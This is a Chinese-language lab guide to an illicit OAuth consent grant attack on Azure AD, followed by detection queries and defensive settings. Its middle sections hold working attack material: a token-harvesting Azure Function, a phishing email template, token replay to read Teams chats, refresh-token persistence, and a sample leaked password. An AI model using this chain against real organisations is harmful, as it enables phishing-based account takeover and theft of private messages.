# Learning Objective 14：非法同意授予攻击与 Teams 数据窃取

> **本文档基于 [AzureAD-Attack-Defense-frame](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense) 项目资料编写**
>
> **核心参考文档：** [ConsentGrant.md](ConsentGrant.md) - Consent Grant Attack 详细理论

---

## 目录

- [1. 攻击概述](#1-攻击概述)
- [2. 理论基础](#2-理论基础)
  - [2.1 OAuth 2.0 授权机制](#21-oauth-20-授权机制)
  - [2.2 多租户应用架构](#22-多租户应用架构)
  - [2.3 权限类型详解](#23-权限类型详解)
- [3. MITRE ATT&CK 框架映射](#3-mitre-attck-框架映射)
- [4. 实验条件与前置要求](#4-实验条件与前置要求)
- [5. 实验步骤详解](#5-实验步骤详解)
  - [5.1 阶段一：侦察 (Reconnaissance)](#51-阶段一侦察-reconnaissance)
  - [5.2 阶段二：攻击基础设施搭建](#52-阶段二攻击基础设施搭建)
  - [5.3 阶段三：构造钓鱼链接并执行](#53-阶段三构造钓鱼链接并执行)
  - [5.4 阶段四：提取 Token 并窃取数据](#54-阶段四提取-token-并窃取数据)
- [6. 步骤设计原理解析](#6-步骤设计原理解析)
- [7. 检测方法](#7-检测方法)
- [8. 防御策略](#8-防御策略)
- [9. 参考资料](#9-参考资料)

---

## 1. 攻击概述

### 1.1 核心目标

本实验模拟 **Kill Chain 4 (KC4)** 阶段的非法同意授予攻击（Illicit Consent Grant Attack），也称为 **OAuth 钓鱼攻击**。与传统的设备代码钓鱼不同，这种攻击方式更加隐蔽且具有持久性。

**主要目标：**

| 阶段 | 目标 | 说明 |
|------|------|------|
| 侦察 | 发现目标用户 | 从 OilCorp 官网找到 Application Administrator `RayKYu` |
| 基础设施 | 构建攻击架构 | 在攻击者租户中创建恶意 OAuth 应用（App Registration + Azure Function + Storage） |
| 执行 | 诱导授权 | 诱导受害者点击链接并授予恶意应用权限 |
| 利用 | 数据窃取 | 获取 Access Token，读取 Teams 聊天记录，发现敏感凭据 |

### 1.2 为什么选择这种攻击方式？

**与密码攻击的对比：**

```
密码攻击 vs. 非法同意攻击

密码攻击（如密码喷射、暴力破解）：
├── 需要破解或窃取用户密码
├── 容易被 MFA 阻止
├── 留下明显的登录失败记录
└── 可以通过重置密码来缓解

非法同意攻击：
├── 不需要用户密码
├── 绕过 MFA（用户主动授权）
├── 看似正常的授权活动
└── 重置密码无效（Token 仍然有效）
```

**类比：授权委托书**

> **密码攻击**：像是偷了你的车钥匙
>
> **非法同意攻击**：像是骗你签了一份"车辆使用委托书"
> - 攻击者伪装成合法的"车辆保养服务"（恶意 App）
> - 他说："为了保养你的车，请签个字允许我开你的车"
> - 你签了字（点击 Accept）
> - 攻击者拿着这份委托书（Token），就可以合法地把你的车开走
> - 如果申请了 `offline_access`，甚至每天都来开（刷新令牌）
> - 而你甚至没有意识到钥匙还在自己兜里，密码也没泄露

---

## 2. 理论基础

### 2.1 OAuth 2.0 授权机制

**OAuth 2.0 授权码流（Authorization Code Flow）是攻击利用的核心机制。**

```
标准 OAuth 2.0 授权码流程：

用户                     微软 Azure AD                     恶意应用
  │                            │                               │
  │  1. 点击钓鱼链接            │                               │
  ├───────────────────────────>│                               │
  │    (授权请求)                │                               │
  │                            │                               │
  │                            │  2. 显示权限请求页面            │
  │<───────────────────────────┤                               │
  │                            │                               │
  │  3. 用户点击"接受"          │                               │
  ├───────────────────────────>│                               │
  │                            │                               │
  │                            │  4. 返回授权码                 │
  │<───────────────────────────┤──────────────────────────────>│
  │                            │      (重定向到 redirect_uri)    │
  │                            │                               │
  │                            │                               │  5. 用授权码换取 Token
  │                            │<──────────────────────────────┤
  │                            │                               │
  │                            │  6. 返回 Access Token          │
  │                            │───────────────────────────────>│
  │                            │                               │
  │                            │                               │  7. 使用 Token 访问数据
  │                            │<──────────────────────────────┤
```

**攻击利用的关键点：**

1. **权限请求透明化**：用户看到的是一个看似正常的权限请求页面
2. **多租户应用机制**：攻击者可以在自己的租户注册应用，但让其他租户的用户使用
3. **Token 自动颁发**：用户授权后，Azure AD 自动颁发有效 Token

### 2.2 多租户应用架构

**为什么多租户应用可以被攻击利用？**

在 Azure AD 中，应用可以是：

| 应用类型 | 说明 | 谁可以使用 |
|----------|------|------------|
| 单租户 (Single-tenant) | 仅在注册租户内可用 | 仅注册租户的用户 |
| 多租户 (Multi-tenant) | 可被其他租户的用户使用 | 任何 Azure AD 租户的用户 |

**多租户应用的工作原理：**

```
攻击者租户 (nomoreoil)              受害者租户 (oilcorporation)
    │                                      │
    │  1. 注册应用 studentX                │
    │     - 账户类型：任何组织目录          │
    │     - 即：多租户                      │
    │                                      │
    │  2. 配置权限和重定向 URI              │
    │     - Chat.Read                      │
    │     - User.ReadBasic.All             │
    │     - redirect_uri: 攻击者的 Function│
    │                                      │
    │  3. 构造授权 URL                      │
    │     - /common/oauth2/authorize       │
    │     - 使用 /common 而非 /租户ID       │
    │                                      │
    └──────────────────────────────────────┘
                    │
                    ▼
        Ray (oilcorporation 用户)
                    │
        点击链接 → 看到"学生应用"
                  请求：读取 Teams 聊天
                  来源：看起来是微软官方页面
                    │
                  授权
                    │
                    ▼
        Azure AD 验证应用
        发现是多租户应用
        颁发 Token 给攻击者的应用
```

### 2.3 权限类型详解

**OAuth 2.0 中的权限类型：**

```
权限类型层级图：

Application Permissions (应用程序权限)
├── 需要管理员同意
├── 适用于服务主体
├── 权限范围：租户级别
└── 示例：User.Read.All, Mail.Read.All

Delegated Permissions (委托权限)
├── 用户可以授予
├── 需要用户上下文
├── 权限范围：用户授权的数据
└── 示例：User.Read, Mail.Read
    ├── 低风险 (Low Impact)
    │   ├── User.Read
    │   ├── User.ReadBasic.All
    │   └── Chat.Read
    └── 高风险 (High Impact)
        ├── Mail.ReadWrite
        ├── Files.ReadWrite.All
        └── User.ReadWrite.All
```

**本实验使用的权限：**

| 权限 | 类型 | 风险级别 | 说明 |
|------|------|----------|------|
| `Chat.Read` | 委托权限 | 中 | 读取用户的所有 Teams 聊天消息 |
| `User.ReadBasic.All` | 委托权限 | 低 | 读取所有用户的基本信息 |
| `offline_access` | 委托权限 | 高 | 获取刷新令牌，实现持久化访问 |

**为什么 `offline_access` 关键？**

```
没有 offline_access：
Access Token (有效期 ~1 小时)
    │
    └── 过期后需要重新获取
        └── 需要用户再次交互
            └── 攻击链中断

有 offline_access：
Access Token (有效期 ~1 小时)
    │
    ├── 使用中...
    │
Refresh Token (长期有效)
    │
    └── 静默刷新 Access Token
        └── 无需用户交互
            └── 持久化访问
```

---

## 3. MITRE ATT&CK 框架映射

根据 [Consent_Grant.json](media/mitre/AttackScenarios/Consent_Grant.json)，非法同意授予攻击映射到以下 MITRE ATT&CK 技术：

| Tactic | Technique | 说明 |
|--------|-----------|------|
| **Initial Access** | T1566.002 | 通过钓鱼链接诱导用户授权恶意应用 |
| **Initial Access** | T1078 | 获取并滥用现有账户凭据（Access Token） |
| **Defense Evasion** | T1550.001 | 利用窃取的应用访问令牌绕过认证 |
| **Credential Access** | T1528 | 窃取应用访问令牌作为凭据 |
| **Lateral Movement** | T1550.001 | 使用窃取的令牌访问受限资源 |

**详细映射可查看：**
- [Consent_Grant.svg](media/mitre/AttackScenarios/Consent_Grant.svg) - 可视化映射图
- [在 MITRE ATT&CK Navigator 中查看](https://mitre-attack.github.io/attack-navigator/#layerURL=https%3A%2F%2Fraw.githubusercontent.com%2FCloud-Architekt%2FAzureAD-Attack-Defense%2Fmain%2Fmedia%2Fmitre%2FAttackScenarios%2FConsent_Grant.json)

---

## 4. 实验条件与前置要求

### 4.1 为什么需要这些条件？

| 条件 | 必要性说明 | 替代方案/影响 |
|------|-----------|--------------|
| **攻击者租户账户** | 需要注册恶意应用并配置 Azure Function | 无法创建多租户应用和接收 Token |
| **Azure Function** | 自动化处理 OAuth 回调，将授权码换取 Token | 需要手动处理，攻击链更复杂 |
| **Storage Account** | 安全存储窃取的 Token | Token 无处存储，容易丢失 |
| **受害者角色权限** | 目标用户需要有敏感数据可访问 | 攻击价值降低 |
| **目标使用 Teams** | 需要 Chat.Read 权限有价值 | 权限请求看起来更可疑 |

### 4.2 基础设施组件详解

```
攻击基础设施架构：

┌─────────────────────────────────────────────────────────────────┐
│                        攻击者租户 (nomoreoil)                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────┐      ┌──────────────────┐                │
│  │  App Registration│      │  Azure Function  │                │
│  │   (studentX)     │      │  (studentX)      │                │
│  ├──────────────────┤      ├──────────────────┤                │
│  │ • Client ID      │──────│ • 自动处理 OAuth  │                │
│  │ • Client Secret  │      │   回调           │                │
│  │ • Redirect URI   │      │ • 换取 Token     │                │
│  │ • API 权限       │      │ • 存储到 Table   │                │
│  └──────────────────┘      └────────┬─────────┘                │
│                                     │                           │
│                                     ▼                           │
│                           ┌──────────────────┐                 │
│                           │  Storage Account │                 │
│                           │  (icgstoreacc)   │                 │
│                           ├──────────────────┤                 │
│                           │ • Table: studentX│                 │
│                           │ • 存储 Token     │                 │
│                           └──────────────────┘                 │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘

                              ▲
                              │ 授权回调
                              │
┌─────────────────────────────┼─────────────────────────────────┐
│  受害者 (Ray)               │   Azure AD                       │
│  • 点击钓鱼链接             │   • 验证用户身份                 │
│  • 授权恶意应用             │   • 显示权限请求                 │
│  • 被重定向到 Office.com    │   • 颁发授权码                   │
└─────────────────────────────┴─────────────────────────────────┘
```

### 4.3 实验前置检查清单

**攻击者侧准备：**

- [ ] Azure 订阅和 Azure AD 租户访问权限
- [ ] 注册多租户应用的权限（或 Application Developer 角色）
- [ ] 部署 Azure Function 的权限
- [ ] 创建 Storage Account 的权限
- [ ] PowerShell 环境（用于执行部署脚本）

**受害者侧条件：**

- [ ] 目标用户使用 Microsoft Teams
- [ ] 目标用户在 Teams 中有敏感聊天记录
- [ ] 目标用户可以接收外部邮件

---

## 5. 实验步骤详解

### 5.1 阶段一：侦察 (Reconnaissance)

**目标：** 确定攻击目标

**步骤：**

```powershell
# 1. 访问目标组织的公开网站
# URL: https://explorationportal.z13.web.core.windows.net/

# 2. 导航到 "Working with Us" 页面

# 3. 查找 Application Administrator 联系信息
# 发现：RayKYu@oilcorporation.onmicrosoft.com
```

**为什么这个目标？**

- Application Administrator 角色可以管理应用注册
- 可能有权访问敏感的应用凭据和配置
- Teams 聊天中可能包含其他用户的凭据信息

**参考文档：** [PasswordSpray.md](PasswordSpray.md) - 侦察阶段的方法论

---

### 5.2 阶段二：攻击基础设施搭建

这是本实验最复杂的部分，涉及多个 Azure 服务的配置。

#### 5.2.1 注册恶意应用 (App Registration)

**步骤：**

```powershell
# 1. 访问 Azure Portal > App registrations
# URL: https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade

# 2. 点击 "New registration"

# 3. 配置应用：
#    - Name: studentX (使用你自己的学号/标识符)
#    - Supported account types: "Accounts in any organizational directory (Any Azure AD directory - Multitenant)"
#    - Redirect URI: Web
#      https://studentXfunction.azurewebsites.net/api/studentX

# 4. 记录以下信息：
#    - Application (client) ID: 保存到变量 $AppId
#    - Directory (tenant) ID: 保存到变量 $TenantId
```

**关键配置说明：**

| 配置项 | 值 | 为什么？ |
|--------|-----|---------|
| 名称 | studentX | 看起来像正常的学生应用，降低怀疑 |
| 账户类型 | 任何组织目录 | 使其他租户的用户可以授权此应用 |
| 重定向 URI | Function URL | 接收 OAuth 回调并自动处理 |

**添加 API 权限：**

```powershell
# 1. 在应用中导航到 "API permissions"
# 2. 点击 "Add a permission" > "Microsoft Graph" > "Delegated permissions"
# 3. 添加以下权限：
#    - Chat.Read (读取用户的所有聊天消息)
#    - User.ReadBasic.All (读取所有用户的基本信息)
```

**创建客户端密钥：**

```powershell
# 1. 导航到 "Certificates & secrets"
# 2. 点击 "New client secret"
# 3. 配置：
#    - Description: ICG Attack Secret
#    - Expires: 180 days (或根据实验要求)
# 4. 复制密钥值并保存到变量 $ClientSecret
#    ⚠️ 密钥只显示一次，请立即保存！
```

**理论依据：** 参考 [ConsentGrant.md](ConsentGrant.md#disable-default-permissions-for-app-registrations) - 应用注册的权限配置

#### 5.2.2 配置存储 (Storage Account)

**步骤：**

```powershell
# 1. 创建或使用现有的 Storage Account
#    名称：icgstoreacc (或根据实验指南)

# 2. 在 Storage Account 中创建 Table
#    - Table 名称: studentX (与你的标识符一致)

# 3. 记录连接字符串
```

**为什么使用 Storage Table？**

- 轻量级 NoSQL 存储，适合键值对数据
- 可以存储 Token 及其元数据
- 支持快速查询和检索
- 成本低，适合实验环境

#### 5.2.3 部署 Azure Function

**Azure Function 是攻击链的核心组件，负责：**

1. 接收 OAuth 回调（授权码）
2. 使用授权码换取 Access Token
3. 将 Token 存储到 Storage Table
4. 将用户重定向到 Office.com（降低怀疑）

**部署脚本：**

```powershell
# 使用项目提供的脚本
# 假设脚本位置：scripts/ICG/New-IcgFunction.ps1

# 参数配置
$Params = @{
    FunctionName = "studentX"
    ClientId = $AppId
    ClientSecret = $ClientSecret
    TableName = "studentX"
    StorageConnectionString = $StorageConnectionString
}

# 执行部署
# New-IcgFunction @Params

# 或者使用配置脚本
# .\configX.ps1
```

**Function 核心逻辑：**

```powershell
# Azure Function HTTP 触发器伪代码
using namespace System.Net

param($Request, $TriggerMetadata)

# 1. 从查询参数中获取授权码
$authCode = $Request.Query['code']

# 2. 构造 Token 请求
$tokenRequest = @{
    grant_type = "authorization_code"
    client_id = $env:ClientID
    client_secret = $env:ClientSecret
    code = $authCode
    redirect_uri = $env:RedirectUri
}

# 3. 向 Azure AD Token 端点发送请求
$tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Method Post -Body $tokenRequest

# 4. 存储 Token 到 Table
$entity = @{
    PartitionKey = $tokenResponse.id_token.upn
    RowKey = [Guid]::NewGuid().ToString()
    AccessToken = $tokenResponse.access_token
    RefreshToken = $tokenResponse.refresh_token
    ExpiresOn = (Get-Date).AddSeconds($tokenResponse.expires_in)
}
# ... 存储逻辑

# 5. 重定向用户到 Office.com
$redirectUrl = "https://www.office.com"
Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
    StatusCode = [HttpStatusCode]::TemporaryRedirect
    Headers = @{ Location = $redirectUrl }
})
```

**为什么这样设计？**

| 设计决策 | 原因 |
|----------|------|
| 自动换 Token | 用户无需额外操作，完全自动化 |
| 存储 Token | 便于后续使用和分析 |
| 重定向到 Office.com | 用户以为操作成功，不会怀疑 |
| 使用环境变量 | 保护敏感配置（Client Secret） |

---

### 5.3 阶段三：构造钓鱼链接并执行

#### 5.3.1 构造授权 URL

```http
https://login.microsoftonline.com/common/oauth2/v2./authorize?
client_id=<你的App_ID>&
response_type=code&
redirect_uri=<你的Function_URL>&
scope=https://graph.microsoft.com/.default offline_access&
response_mode=query&
prompt=consent
```

**URL 参数详解：**

| 参数 | 值 | 说明 |
|------|-----|------|
| `client_id` | 你的应用 ID | 标识请求授权的应用 |
| `response_type` | `code` | 请求授权码（授权码流） |
| `redirect_uri` | Function URL | 授权后重定向的位置 |
| `scope` | `.default offline_access` | 请求的权限范围 |
| `response_mode` | `query` | 授权码通过查询参数返回 |
| `prompt` | `consent` | 强制显示同意页面 |

**为什么使用 `/common/` 而非 `/tenantID/`？**

- `/common/` 是通用端点，允许任何租户的用户登录
- 攻击者不需要提前知道受害者的租户 ID
- 简化了攻击流程

#### 5.3.2 为什么需要 `offline_access`？

```
Token 生命周期对比：

┌─────────────────────────────────────────────────────────────┐
│                    没有 offline_access                       │
├─────────────────────────────────────────────────────────────┤
│  Access Token (1小时)                                        │
│      │                                                       │
│      ├── 过期 ────────────────────────> 需要重新登录        │
│      │                           (用户交互)                 │
│      ▼                                                       │
│   攻击中断                                                    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    有 offline_access                        │
├─────────────────────────────────────────────────────────────┤
│  Access Token (1小时)                                        │
│      │                                                       │
│      ├── 过期                                                │
│      │    │                                                  │
│      │    ▼                                                  │
│      │ Refresh Token (长期有效)                              │
│      │    │                                                  │
│      │    ├── 自动刷新 ───────────────> 新的 Access Token   │
│      │    │                              (无需用户交互)      │
│      │    └── 持续访问                                         │
│      ▼                                                       │
│   持久化控制                                                  │
└─────────────────────────────────────────────────────────────┘
```

#### 5.3.3 发送钓鱼邮件

```powershell
# 邮件模板
$MailSubject = "Important: Student Application Access Required"
$MailBody = @"
Dear Ray,

We need you to authorize access to the student application for your coursework.
Please click the link below to grant necessary permissions:

<a href="$PhishingUrl">Authorize Student Application</a>

If you have any questions, please contact IT support.

Best regards,
Student Services
"@

# 在实验环境中，可以使用模拟发送或直接提供链接
```

**在实验环境中：**
- Lab 系统通常会自动处理授权流程
- 目标用户会自动点击并授权

---

### 5.4 阶段四：提取 Token 并窃取数据

#### 5.4.1 获取 Token

```powershell
# 1. 访问 Storage Account 中的 Table
# 2. 查找 studentX 表
# 3. 找到新记录的 Token

# 使用 Azure Storage Explorer 或 Azure Portal
# 或使用 PowerShell
$context = New-AzStorageContext -StorageAccountName "icgstoreacc" -UseConnectedAccount
$table = Get-AzStorageTable -Name "studentX" -Context $context

# 获取所有 Token 记录
$tokens = Get-AzTableRow -Table $table

# 查找目标的 Access Token
$targetToken = $tokens | Where-Object { $_.PartitionKey -eq "RayKYu@oilcorporation.onmicrosoft.com" } | Select-Object -First 1
$accessToken = $targetToken.AccessToken
```

#### 5.4.2 使用 Token 连接 Microsoft Graph

```powershell
# 安装 Microsoft Graph PowerShell 模块（如果尚未安装）
# Install-Module Microsoft.Graph -Scope CurrentUser

# 使用 Access Token 连接
Connect-MgGraph -AccessToken $accessToken

# 验证连接
Get-MgContext
```

**为什么使用 `Connect-MgGraph -AccessToken`？**

- 直接使用窃取的 Token，无需用户凭据
- 完全以受害者身份操作
- 绕过 MFA（MFA 声明已在 Token 中）

#### 5.4.3 读取 Teams 聊天记录

```powershell
# 1. 列出所有聊天
$chats = Get-MgChat -All

# 2. 查看聊天列表
$chats | Format-List Id, Topic, CreatedDateTime

# 3. 选择目标聊天（假设找到一个特定的聊天 ID）
$chatId = "19:...107d81efc6ae..."

# 4. 读取聊天消息
$messages = Get-MgChatMessage -ChatId $chatId -All

# 5. 显示消息内容
$messages | ForEach-Object {
    [PSCustomObject]@{
        From = $_.From.User.DisplayName
        DateTime = $_.CreatedDateTime
        Content = $_.Body.Content
    }
} | Format-Table -AutoSize
```

**可能的发现：**

```
From        DateTime              Content
----        ---------              -------
Ray KYu     2024-01-15 10:23:00   Hey Adam, here are the credentials for the new VM:
Ray KYu     2024-01-15 10:24:00   Username: carljmorales
Ray KYu     2024-01-15 10:24:00   Password: Ac*Ik8+U1C0e:6!!aF[y
Adam Smith  2024-01-15 10:25:00   Thanks, got it!
```

**发现的信息：**
- 新用户：`carljmorales` (Carl)
- 密码：`Ac*Ik8+U1C0e:6!!aF[y`
- 上下文：VM 操作请求

#### 5.4.4 使用 Refresh Token（如果需要）

```powershell
# 如果 Access Token 过期，使用 Refresh Token 获取新的

$refreshToken = $targetToken.RefreshToken

# 构造刷新请求
$refreshBody = @{
    client_id = $AppId
    client_secret = $ClientSecret
    refresh_token = $refreshToken
    grant_type = "refresh_token"
}

# 请求新 Token
$newToken = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Method Post -Body $refreshBody

# 使用新的 Access Token
$newAccessToken = $newToken.access_token
Connect-MgGraph -AccessToken $newAccessToken
```

---

## 6. 步骤设计原理解析

### 6.1 为什么需要 Azure Function？

| 问题 | 不使用 Function | 使用 Function |
|------|-----------------|---------------|
| 授权码处理 | 需要手动复制并使用 | 自动接收并处理 |
| Token 换取 | 手动编写代码请求 | Function 自动执行 |
| 用户体验 | 用户看到错误页面 | 重定向到 Office.com |
| 检测风险 | 需要攻击者持续在线 | 完全自动化 |

### 6.2 为什么使用 Storage Table？

- **安全性**：不需要暴露数据库端点
- **简洁性**：无需复杂的数据库配置
- **可扩展性**：可以存储多个受害者的 Token
- **可检索性**：支持按用户查询

### 6.3 为什么要重定向到 Office.com？

**用户体验视角：**
```
用户授权流程（攻击者视角）：

正常流程（用户期望）：
点击链接 → 授权 → 访问应用

攻击流程（实际发生）：
点击链接 → 授权 → 重定向到 Office.com
                     ↑
                     用户以为是正常跳转
                     实际上 Token 已被窃取
```

**检测规避：**
- 用户不会立即察觉异常
- 延迟了攻击被发现的时间
- 看起来像正常的 OAuth 流程

### 6.4 为什么选择 Chat.Read 权限？

**Teams 聊天的价值：**

```
Teams 聊天中可能包含的信息：

├── 凭据信息
│   ├── 新用户账户凭据
│   ├── 服务账户密码
│   └── API 密钥
├── 敏感文档链接
│   ├── SharePoint 文档
│   ├── OneDrive 文件
│   └── 外部共享链接
├── 组织结构信息
│   ├── 团队成员列表
│   ├── 项目讨论
│   └── 决策记录
└── 业务机密
    ├── 产品计划
    ├── 财务数据
    └── 战略讨论
```

**与其他权限的对比：**

| 权限 | 数据类型 | 检测难度 | 持久化 |
|------|----------|----------|--------|
| Mail.Read | 邮件 | 中 | 低 |
| Files.Read.All | 文件 | 高 | 低 |
| Chat.Read | 聊天 | 低 | 中 |
| User.ReadBasic.All | 用户信息 | 低 | 低 |

---

## 7. 检测方法

根据 [ConsentGrant.md](ConsentGrant.md#detection) 和项目资料，以下是检测非法同意授予攻击的方法：

### 7.1 Azure AD Audit Logs

**关键事件类型：**

```kusto
// 查询用户同意授予
AuditLogs
| where Category == "ApplicationManagement"
| where OperationName in ("Consent to application", "Add app role assignment to service principal")
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, AdditionalDetails
```

**关键指标：**
- 异常的应用授权活动
- 来自未知发布者的应用
- 权限超出正常范围

**参考位置：**
- Azure Portal > Azure AD > Audit logs
- Microsoft 365 Compliance Portal > Audit

### 7.2 Azure AD Workbooks

**内置 Workbook：**
- "Application Sign-ins" - 查看应用登录活动
- "Consent Requests" - 分析同意请求模式

**参考：** [ConsentGrant.md](ConsentGrant.md#azure-workbooks)

### 7.3 Microsoft Defender for Cloud Apps (MDA)

**内置检测规则：**

| 规则 | 检测内容 | 说明 |
|------|----------|------|
| Malicious OAuth app consent | 恶意应用授权 | 基于威胁情报识别 |
| Misleading OAuth app name | 误导性应用名称 | 检测仿冒应用 |
| Unusual addition of credentials | 异常凭据添加 | 检测凭据异常添加 |

**配置位置：**
```
Microsoft Defender Portal > Cloud Apps > Policies > App policies
```

### 7.4 App Governance

**App Governance 是 MDA 的附加组件，提供：**

- 详细的应用权限分析
- 应用行为监控
- 风险评估和告警

**架构图参考：** [ConsentGrant.md](ConsentGrant.md#app-governance---microsoft-defender-for-cloud-apps-mda-add-on-appg)

### 7.5 Microsoft Sentinel

**内置分析规则：**

```
相关规则（在 queries/ 目录中）：
- Mail.Read Permissions Granted to Application
- Rare Application Consent
```

**自定义检测查询：**

```kusto
// 检测异常的 OAuth 同意授予
AuditLogs
| where Category == "ApplicationManagement"
| where OperationName == "Consent to application"
| where InitiatedBy.user.userPrincipalName <> "" // 排除服务主体
| extend AppId = tostring(TargetResources[0].id)
| extend Permissions = tostring(TargetResources[0].modifiedProperties[0].newValue)
| where Permissions contains "Chat.Read"
   or Permissions contains "Mail.Read"
   or Permissions contains "Files.Read"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, AppId, Permissions, CorrelationId
```

---

## 8. 防御策略

根据 [ConsentGrant.md](ConsentGrant.md#mitigation-and-reduced-attack-surface) 和项目最佳实践：

### 8.1 禁用用户应用注册

**配置位置：**
```
Azure Portal > Azure AD > User settings
> App registrations
> "Users can register applications" = No
```

**影响：**
- 普通用户无法创建应用注册
- 减少恶意应用的创建

**替代方案：**
- 使用 Application Developer 角色委派权限
- 使用自定义角色限制应用注册

### 8.2 限制用户同意权限

**推荐配置：**
```
Azure Portal > Azure AD > User settings
> Enterprise applications > Consent and permissions
> User consent for applications
> "Allow consent for apps from verified publishers"
> "On selected permissions"
```

**配置低风险权限：**
```
Azure Portal > Azure AD > User settings
> Enterprise applications > Consent and permissions
> Permission classifications
> 添加 "User.Read", "User.ReadBasic.All", "Chat.Read" 到低风险
```

### 8.3 启用管理员审批工作流

**配置位置：**
```
Azure Portal > Azure AD > User settings
> Enterprise applications > Admin consent requests (Preview)
```

**效果：**
- 未授权的权限请求需要管理员审批
- 提供审批流程和审计跟踪

### 8.4 实施应用治理

**使用 App Governance：**
- 监控应用行为
- 设置自定义策略
- 自动响应高风险应用

**参考：** [ConsentGrant.md](ConsentGrant.md#app-governance---microsoft-defender-for-cloud-apps-mda-add-on-appg)

### 8.5 安全配置建议汇总

| 控制 | Free License | P1 License | P1 + MDA |
|------|-------------|------------|----------|
| Azure AD Logs | ✓ | ✓ | ✓ |
| Consent Policy | ✓ | ✓ | ✓ |
| 审批工作流 | - | ✓ | ✓ |
| 自动修复 | - | - | ✓ |
| App Governance | - | - | ✓ |

---

## 9. 参考资料

### 9.1 项目内部文档

| 文档 | 路径 | 说明 |
|------|------|------|
| Consent Grant Attack | [ConsentGrant.md](ConsentGrant.md) | 详细的攻击理论和防御策略 |
| Identity Security Monitoring | [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) | 身份安全监控概述 |
| Project README | [README.md](README.md) | 项目整体介绍 |

### 9.2 MITRE ATT&CK 映射

| 资源 | 路径 |
|------|------|
| Consent Grant JSON | [media/mitre/AttackScenarios/Consent_Grant.json](media/mitre/AttackScenarios/Consent_Grant.json) |
| Consent Grant SVG | [media/mitre/AttackScenarios/Consent_Grant.svg](media/mitre/AttackScenarios/Consent_Grant.svg) |

### 9.3 检测查询

| 类型 | 位置 |
|------|------|
| Sentinel 查询 | [queries/](queries/) |
| 自定义规则模板 | [config/ruletemplates/](config/ruletemplates/) |

### 9.4 官方 Microsoft 文档

- [Detect and Remediate Illicit Consent Grants](https://learn.microsoft.com/en-us/microsoft-365/security/defender/detect-and-remediate-illicit-consent-grants)
- [Permissions and consent in the Microsoft identity platform](https://learn.microsoft.com/en-us/entra/identity-platform/permissions-consent-overview)
- [Microsoft Graph API - List chats](https://learn.microsoft.com/en-us/graph/api/chat-list)
- [Configure user consent](https://learn.microsoft.com/en-us/azure/active-directory/manage-apps/configure-user-consent?tabs=azure-portal)

### 9.5 社区资源

- [Get-AzureADPSPermissions.ps1](https://gist.github.com/psignoret/9d73b00b377002456b24fcb808265c23) - Philippe Signoret 的权限查询脚本
- [CloudShellAadApps](https://github.com/jsa2/CloudShellAadApps) - Joosua Santasalo 的 AAD 应用分析工具

---

**文档版本：** 2.0
**最后更新：** 2024年
**基于项目：** [AzureAD-Attack-Defense-frame](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense)
